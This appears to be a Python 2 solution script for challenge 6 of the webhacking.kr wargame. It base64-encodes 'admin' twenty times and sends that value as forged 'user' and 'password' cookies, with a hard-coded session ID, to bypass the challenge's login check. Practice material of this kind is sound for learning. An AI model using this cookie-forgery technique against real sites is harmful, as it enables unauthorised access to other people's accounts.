import requests

result ="admin"
for i in range(1,21):
	result = result.encode("base64").replace("\n","")

result = result.replace("\n","")

print result

url = "http://webhacking.kr/challenge/web/web-06/index.php"

headers = {
	"Cookie":"PHPSESSID=ce7d7b3317819f9f01951a6263279e37; user=Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFjVkZ0UmxSTmJFcEpWbTEwYTFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMWRyV25kV01ERkZVbFJHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbGhTV0ZSV2FFTlNiRnBZWlVaT1ZXSlZXVEpWYkZKRFZqQXhkVlZ1V2xaaGExcFlXa1ZhVDJOc2NFZGhSMnhUVFcxb2IxWXhaREJaVmxsM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpKNFQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSGFGQlZiVEUwVmpGU1ZtRkhPVmhTTUhCNVZHeGFjMWR0U2tkWGJXaGFUVzVvV0ZreFdrZFdWa3B6VkdzMVYySkdhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WazVPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0ROV2FrWkxWakpPU1dKR1pGZFNWWEJ2Vm10U1MxUXlUWGxVYTFwb1VqTkNWRmxZY0ZkWFZscFlZMFU1YVUxcmJEUldNalZUVkd4a1NGVnNXbFZXYkhCWVZHdGFWbVZIUmtoUFYyaHBVbGhDTmxkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZZd01WWmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UW5oV1YzaHJWVEZzVjFWc1dsaGlWVnBQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPV21FeVVrZGFWM2hIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25OT2JFcHpXa2R3YVZORlNrbFdNblJyWXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdiR1JvVW5wc2IxUldXbmRsYkZsNVkwVmtWMDFFUmpGWlZXaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWhpUm1oVFZsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGbFpiWGhoVm14c2NscEhPV3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFdWWktjMVJ1VG1oU2JGcFlXV3hhUm1ReFduRlJiVVphVm0xU1NWWlhkRzloTVVwMFlVWlNWVlpXY0dGVVZscGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1WcHlWMjFHYWxacmNEQmFSV1F3VmpKS2NsTnJhRmRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtaV1VsZEhhRlJVVm1SVFpXeHNWbGRzVG1oU1ZFWjZWVEkxYjFZeFdYcFZiR2hZVm14d1lWcFZXbXRrVmtwelZtMXNWMUl6YURWV01XUXdXVmRSZVZaclpGZGliRXB5Vld0V1MySXhiRmxqUldSc1ZteEtlbFp0TURWWFIwcEhZMFpvV2sxSGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwWTBWa1dsWXdWalJXYkdodlYwWmtTR0ZHV2xwaVdHaG9WbTE0YzJOc1pISmtSM0JUWWtad05GWlhNVEJOUmxsNFYyNU9hbEpYYUZoV2FrNVRWRVpzVlZGWWFGTldhM0I2VmtkNFlWVXlTa1pYV0hCWFZsWndSMVF4V2tOVmJFSlZUVVF3UFE9PQ==; password=Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFjVkZ0UmxSTmJFcEpWbTEwYTFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMWRyV25kV01ERkZVbFJHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbGhTV0ZSV2FFTlNiRnBZWlVaT1ZXSlZXVEpWYkZKRFZqQXhkVlZ1V2xaaGExcFlXa1ZhVDJOc2NFZGhSMnhUVFcxb2IxWXhaREJaVmxsM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpKNFQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSGFGQlZiVEUwVmpGU1ZtRkhPVmhTTUhCNVZHeGFjMWR0U2tkWGJXaGFUVzVvV0ZreFdrZFdWa3B6VkdzMVYySkdhM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWVzB4YjFZeFVsaE9WazVPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0ROV2FrWkxWakpPU1dKR1pGZFNWWEJ2Vm10U1MxUXlUWGxVYTFwb1VqTkNWRmxZY0ZkWFZscFlZMFU1YVUxcmJEUldNalZUVkd4a1NGVnNXbFZXYkhCWVZHdGFWbVZIUmtoUFYyaHBVbGhDTmxkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZZd01WWmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UW5oV1YzaHJWVEZzVjFWc1dsaGlWVnBQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPV21FeVVrZGFWM2hIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25OT2JFcHpXa2R3YVZORlNrbFdNblJyWXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdiR1JvVW5wc2IxUldXbmRsYkZsNVkwVmtWMDFFUmpGWlZXaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWhpUm1oVFZsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGbFpiWGhoVm14c2NscEhPV3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFdWWktjMVJ1VG1oU2JGcFlXV3hhUm1ReFduRlJiVVphVm0xU1NWWlhkRzloTVVwMFlVWlNWVlpXY0dGVVZscGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1WcHlWMjFHYWxacmNEQmFSV1F3VmpKS2NsTnJhRmRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtaV1VsZEhhRlJVVm1SVFpXeHNWbGRzVG1oU1ZFWjZWVEkxYjFZeFdYcFZiR2hZVm14d1lWcFZXbXRrVmtwelZtMXNWMUl6YURWV01XUXdXVmRSZVZaclpGZGliRXB5Vld0V1MySXhiRmxqUldSc1ZteEtlbFp0TURWWFIwcEhZMFpvV2sxSGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwWTBWa1dsWXdWalJXYkdodlYwWmtTR0ZHV2xwaVdHaG9WbTE0YzJOc1pISmtSM0JUWWtad05GWlhNVEJOUmxsNFYyNU9hbEpYYUZoV2FrNVRWRVpzVlZGWWFGTldhM0I2VmtkNFlWVXlTa1pYV0hCWFZsWndSMVF4V2tOVmJFSlZUVVF3UFE9PQ==; oldzombie=1",
	"Host":"webhacking.kr"
}

req = requests.get(url, headers=headers)
print req.content
